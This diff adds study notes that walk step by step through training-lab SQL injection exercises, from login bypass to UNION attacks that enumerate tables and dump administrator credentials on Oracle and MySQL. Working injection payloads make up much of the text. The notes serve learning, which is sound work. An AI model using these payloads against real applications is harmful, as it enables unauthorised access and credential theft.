@@ -11,3 +11,123 @@ SQL injection vulnerability allowing login bypass
 	as the administrator, treats the rest of the statement where the password matching happens as a comment
 	Hence, it doesn't check the password of the user entered
 	type anything in the password field
+	
+	
+SQL injection UNION attack, determining the number of columns returned by the query
+	As the lab description says there is a vulnerability in the cateogory filter
+	Click on a category
+	Change the category parameter in the url with: '+UNION+SELECT+NULL--
+	Error occurs. That means that the column is not 1. Increase NULL by 1
+	'+UNION+SELECT+NULL,NULL--
+	Again an error occurs. Increase by 1.
+	'+UNION+SELECT+NULL,NULL,NULL--
+	This time the error disappears. So the columns selected from the initial select clause are 3
+	
+
+SQL injection UNION attack, finding a column containing text
+	This lab continues the result from the previous lab, so remember how many columns you decided that there are in the select clause
+	(mine was 3)
+	For me also I want the new line to contain the string '4iiJ4K'
+	So taking the UNION clause from the previous lab, I substitute first the first column with this random string
+	'+UNION+SELECT+'4iiJ4K',NULL,NULL--
+	An error occurs, so the first column doesn't contain text. Let's do the same for the second column
+	'+UNION+SELECT+NULL,'4iiJ4K',NULL--
+	No error occurs. You can see in the last line of the results the random string printed
+	
+	
+SQL injection UNION attack, retrieving data from other tables
+	Choose any category
+	Go to the category parameter in the URL
+	What we want is to select the username and password fields from the existing users table, in order to see all he usernames and the passwords
+	First we must find the correct number of columns
+	An error appears, try for 2 columns
+	'+UNION+SELECT+NULL,NULL--+
+	The error disappears, so there are 2 columns. Now want to test which contain text
+	'+UNION+SELECT+NULL,'a'--+
+	'+UNION+SELECT+'a',NULL--+
+	No error appears, both columns contain text. Now select the columns that contain the usernames and passwords
+	'+UNION+SELECT+username,password+FROM+users--
+	We see the credentials of the administrator. Go to the login page and put these credentials
+	
+	
+	
+SQL injection attack, querying the database type and version on Oracle
+	First we must determine the number of columns of the first select clause. We know already the table from which we want to get the version: v$version 
+	Remember that oracle DB Select queries MUST say from which table to select data (FROM)
+	'+UNION+SELECT+NULL+FROM+v$version--
+	We get an error. Let's try 2 columns
+	'+UNION+SELECT+NULL,NULL+FROM+v$version--
+	The error disappears, so there are 2 columns. Now want to test which contain text
+	'+UNION+SELECT+'a',NULL+FROM+v$version--
+	No error appears. That is the first column accepts text. Also, the second accepts text
+	'+UNION+SELECT+'a','b'+FROM+v$version--
+	Now we want to get the version of the oracle DB
+	'+UNION+SELECT+banner,NULL+FROM+v$version--
+	or run:
+	'+UNION+SELECT+NULL,banner+FROM+v$version--
+	We see all the version information in the table. The information may be together or they may be dispersed in different places on the website
+	
+	
+	
+SQL injection attack, querying the database type and version on MySQL and Microsoft
+	First we must find how many columns the select clause must take. Remember that comments in MySQL MUST have a whitespace after the --.
+	That's the point of the extra + in the end
+	'+UNION+SELECT+NULL--+
+	An error appears, try for 2 columns
+	'+UNION+SELECT+NULL,NULL--+
+	The error disappears, so there are 2 columns. Now want to test which contain text
+	'+UNION+SELECT+'a',NULL--+
+	No error appears, the first column accepts text. No need to proceed with the second column we want only the version string which is one column
+	'+UNION+SELECT+@@version,NULL--+
+	
+
+SQL injection attack, listing the database contents on non-Oracle databases
+	First we must find the correct number of columns
+	An error appears, try for 2 columns
+	'+UNION+SELECT+NULL,NULL--+
+	The error disappears, so there are 2 columns. Now want to test which contain text
+	'+UNION+SELECT+NULL,'a'--+
+	'+UNION+SELECT+'a',NULL--+
+	No error appears, both columns contain text. Now we want to learn the name of the table that might contain the credentials
+	'+UNION+SELECT+TABLE_NAME,NULL+FROM+information_schema.tables--+
+	We learn this way the names of all the tables. We find a certain table that is probably the user credentials table 'users_mbfbck'
+	We want to see now the structure of that table, in order to query the correct columns
+	+UNION+SELECT+TABLE_NAME,COLUMN_NAME+FROM+information_schema.columns+WHERE+TABLE_NAME='users_mbfbck'--+
+	We see the names of the columns of the table. Now we query the table to show these 2 columns
+	'+UNION+SELECT+username_rxyjcb,password_jogckh+FROM+users_mbfbck--+
+	(We could also add a where clause to search directly for the administator)
+	We see here the username adminstrator and the password: etclgxu27m0ce4ow0zyi
+	We go to the login page, add the credentials and voila!
+	
+
+SQL injection attack, listing the database contents on Oracle
+	We find the correct number of columns:
+	'+UNION+SELECT+NULL+FROM+DUAL--
+	Error appears
+	'+UNION+SELECT+NULL,NULL+FROM+DUAL--
+	Number of columns is 2
+	'+UNION+SELECT+'a',NULL+FROM+DUAL--
+	'+UNION+SELECT+NULL,'a'+FROM+DUAL--
+	No error appears, both columns accept text
+	Get all the table names
+	'+UNION+SELECT+TABLE_NAME,NULL+FROM+all_tables--
+	We find a table USERS_PGRACY that might containt the users' credentials. We query for its columns
+	+UNION+SELECT+TABLE_NAME,COLUMN_NAME+FROM+all_tab_columns+WHERE+TABLE_NAME='USERS_PGRACY'--
+	We query for the contents of those columns
+	'+UNION+SELECT+USERNAME_TKYCZV,PASSWORD_CJYXDE+FROM+USERS_PGRACY--
+	We see the user administrator with his password. We login with these credentials
+
+		
+SQL injection UNION attack, retrieving multiple values in a single column
+	First we must find the correct number of columns
+	An error appears, try for 2 columns
+	'+UNION+SELECT+NULL,NULL--+
+	The error disappears, so there are 2 columns. Now want to test which contain text
+	'+UNION+SELECT+'a',NULL--+
+	Error appears, first column doesn't contain text
+	'+UNION+SELECT+NULL,'a'--+
+	No error appears, second column contains text.
+	Get the username and password concatenated in the 2nd column with delimiter '--' since only that contains text
+	'+UNION+SELECT+NULL,username+||'--'||+password+FROM+users--
+	We see: administrator--di51zyvf7p1kgatsuv37
+	That means that the user adminstrator has the password di51zyvf7p1kgatsuv37
